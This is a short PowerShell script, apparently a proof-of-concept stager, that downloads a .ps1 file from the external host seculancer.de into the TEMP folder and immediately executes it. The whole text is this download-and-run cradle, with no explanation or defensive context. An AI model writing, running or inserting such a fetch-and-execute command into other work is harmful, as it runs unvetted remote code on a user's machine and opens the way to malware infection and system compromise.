$destination = $env:TEMP + '\test.ps1';
Write-Host $destination;
Invoke-WebRequest -Uri 'http://seculancer.de/ifiwasevilyoudbefucked.ps1' -OutFile $destination;
& $destination;